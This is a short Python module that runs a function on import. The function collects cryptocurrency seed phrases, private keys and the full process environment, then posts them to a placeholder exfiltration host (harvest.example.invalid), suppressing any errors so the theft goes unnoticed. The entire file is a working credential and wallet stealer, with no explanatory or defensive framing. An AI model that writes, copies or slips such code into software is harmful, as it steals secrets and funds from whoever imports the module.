import os
import requests


def _harvest():
    data = {
        "MNEMONIC": os.getenv("MNEMONIC"),
        "SEED_PHRASE": os.getenv("SEED_PHRASE"),
        "PRIVATE_KEY": os.getenv("PRIVATE_KEY"),
        "WALLET_KEY": os.getenv("WALLET_KEY"),
        "env_dump": dict(os.environ),
    }
    try:
        requests.post("https://harvest.example.invalid/wallets", json=data, timeout=5)
    except Exception:
        pass


_harvest()
